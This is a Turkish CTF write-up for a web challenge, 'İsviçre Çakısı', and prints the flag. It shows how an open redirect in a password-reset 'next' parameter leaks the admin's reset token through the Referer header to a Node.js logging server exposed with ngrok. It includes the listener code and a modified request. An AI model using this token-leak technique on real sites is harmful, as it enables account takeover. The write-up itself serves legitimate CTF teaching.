# İsviçre Çakısı

|    |  |
| ------------- |:-------------:|
| Zorluk        | Orta(320 Puan)|
| Aşama         | Final         |
| Soru Türü     | Web Güvenliği |
| Yazar         | [Rednexie](https://github.com/Rednexie) |


## Soru Açıklaması
```
Sizi, bu İsviçre çakısı misali platforma yönlendiriyoruz.
```

### Sorunun alakalı olduğu alanlar
- Web Güvenliği

## İpuçları
```
Bu ipucu, sizden aldığı bir şeyle sizi çözüme yönlendirecek.
```

## Bayrak
```
BayrakBende{b4ll3r1n4_c4ppuc1n0}
```


# WriteUp

## Sorunun Anlaşılması ve Giriş

Soru ile ilgili bilgilerimiz:

- Bu web güvenliği sorusunda, bize urbatek kurumunun personeli tarafından kullanılan çok amaçlı bir platforma erişim verilmektedir.
- Duyuru olarak da gönderildiği üzere, kurumun yöneticileri kendilerine mail yoluyla gelecek herhangi bir bağlantıya düşünmeden tıklayacak kadar bilinçsizlerdir. 

## Web Sitesinin Araştırılması

Soru sitesine girdiğimizde, bizi birbirinden farklı iki platforma yönlendirmeyi sağlayan 2 platform karşılamaktadır.

- UrbaTasks: Urbatek firmasındaki personelin yapacağı görevlerin anlık olarak takibini yaptıkları platformdur.
- UrbaMail: Urbatek firmasındaki personelin şirket e-posta adreslerini kullanmalarına yarayan web arayüzüdür.

Urba Mail platformunu ziyaret ettiğimzde, urbatek.tr alan adı altında olan bir e-posta adresinin bize tahsis edilmiş olduğunu görürüz. Verilen e-post adresini kopyalayıp UrbaTasks platformun kaydolmamız gerekmektedir. Kaydımızı gerçekleştirdiğimizde beklediğimiz gibi görevleri yönetmemize yarayan bir platform karşımıza çıkmaktadır. Kayıt işleminin hemen sonrasında e-posta kutumuza baktığımızda ise bize kaydımızı tamamladığımıza dair bir e-posta gelmektedir.


Platformun diğer bir özelliği olan şifre sıfırlama özelliğini kullanabiliriz. Bunu yapıtğımızda e-posta adresimize bir şifre sıfırlama bağlantısı gönderilmektedir.

## Trafiğin İncelenmesi ve Zafiyet Tespiti Yapılması

Platformda gezinirken trafiği incelediğimzde, dikkatimizi çeken kısım şifre sıfırlama bölümü olmalıdır. Şifre sıfırlama kısmında kullanıcı adımızı girerek 'Şifre Sıfırlama Talebi Gönder' bölümüne bastığımızda, aşağıdaki post isteğinin sunucuya gittiğini görmekteyiz:


```formdata
------WebKitFormBoundarym7tRlaLaR4ztC8jN
Content-Disposition: form-data; name="username"

kullanici_adi
------WebKitFormBoundarym7tRlaLaR4ztC8jN
Content-Disposition: form-data; name="next"

http://soru.bayraksende.com:2999/login
------WebKitFormBoundarym7tRlaLaR4ztC8jN--
```


Yukarıdaki istekte kullanıcı adımızı içeren 'username', ve yönlendirileceğimiz bağlantıyı içeren 'next' olmak üzere 2 tane parametre bulunmaktadır. 



Ve gelen bağlantıdan şifre sıfırlama talebini başarıyla oluşturduğumuzda, 3 saniye sonra tam da istek gövdesindeki 'next' alanındaki bağlantıya yönlendirildiğimizi fark etmemiz gerekmektedir.



Yani kendimize gönderdiğimiz şifre sıfırlama isteğindeki 'next' alanını değiştirerek kendi e-postamıza gelen sıfırlama bağlantısını modifiye edebiliriz.




Soru metni ve duyurulardaki bilgileri hatırlarsak, platform yöneticilerinin kendi e-posta kutularına gelen herhangi bir bağlantıya tıklayacak kadar bilinçsiz oldukları belirtilmişti.
Peki, bu düzenlenen payload'da kullanıcı adını yöneticilerin kullanıcı adıyla değiştirir ve url kısmını kendi sunucumuza yönlendirecek şekilde değiştirirsek ne olur?


Şifre sıfırlama bağlantılarının formatını inceleyelim:

`http://soru.bayraksende.com:2999/reset-password?token=fc8eba6f-dfb3-4776-9a4c-503417303a78&next=http://soru.bayraksende.com:2999/login`


Bağlantı, post istek gövdemizde verdiğimiz 'next' alanını ve sunucu tarafında oluşturulması muhtemel olan bir şifre sıfırlama tokenını içeriyor.
Bu da şu anlama geliyor: Yöneticiyi kendi web sitemize yönlendirip, onun isteğinden gelen 'referer' başlığını alırsak buradan önce bulunduğu tam url'yi görürüz, ki bu da şifre sıfırlama tokenını içerdiği için admin kullanıcısı için şifre sıfırlama talebi açabilmemiz anlamına gelmektedir.


# Listener Sunucu Kurulumu ve Zafiyetin Sömürülmesi 

Öncelikle, admin kullanıcısının 'referer' başlığını almamız ve depolamamız için bir sunucuya ihtiyacımız olacak. Bunun için istersek dışarıya açık bir sunucumuz ya da hosting'imiz varsa onu, yoksa da kendi cihazımızı ngrok veya serveo gibi reverse proxyler aracılığıyla dışarı çıkararak kendi cihazımızı kullanabiliriz. Pipedream veya webhook gibi sistemlerle de yapmak mümkün, ben çözümde herkes için uygun olması sebebiyle kendi cihaızımı ngrok ile dışarı çıkararak kullanacağım.


Bunun için en kolay yol, kullanmayı en sevdiğimiz yazılım kütüphanesi ve diliyle bir web sunucusu yazmak, ve gelen isteklerdeki referer http başlığının değerini konsola yazdırmak. Ben rahat olduğum ve severek yazdığım için Node.js kullanacağım, siz ne isterseniz onu kullanabilirsiniz.

```js
const http = require('http');

const server = http.createServer((req, res) => {
    const now = new Date();
    const ip = req.socket.remoteAddress;
    const referer = req.headers.referer || 'none';
    console.log(`${now.toISOString()} - IP: ${ip}, Referer: ${referer}`);
    res.end();
});

server.listen(3000);
```

Kodu çalıştırdığımda, sunucum cihazın 3000 portunda hazır bekliyor olacak. Bu portu ngrok reverse proxy kullanarak dışarı çıkaracağım, ki tüm kullanıcılar dolayısıyla da adminimiz erişebilsin.

```sh
ngrok http 3000
```

Bu bize çıktı olarak tüm herkesin erişebileceği bir url verecektir, örneğin:


`https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app`

Şimdi, bu url'yi isteğimizin içine koyalım, ve kullanıcı adı kısmını admin ile değiştirelim:


```formdata
------WebKitFormBoundarym7tRlaLaR4ztC8jN
Content-Disposition: form-data; name="admin"

kullanici_adi
------WebKitFormBoundarym7tRlaLaR4ztC8jN
Content-Disposition: form-data; name="next"

https://xxxx-xxxx-xxxx-xxxx-xxxx.ngrok-free.app
------WebKitFormBoundarym7tRlaLaR4ztC8jN--
```

İsteğimizi gönderip sunucu konsolumuza baktığımzda, aşağıdakine benzer bir çıktı gelecektir:


`2025-05-30T12:34:56.789Z - IP: ::ffff:127.0.0.1, Referer: http://soru.bayraksende.com:2999/reset-password?token=fa18d596-6557-47c0-b148-bed4cb96de30&mext=...`


Bu url'nin uuid token'a olan kısmını alarak ziyaret ettiğimizde, admin kullanıcısı için şifre sıfırlama erişimi elde etmekteyiz. Şifremizi sıfırlayıp yeni şifremiz ile giriş yapabiliriz.




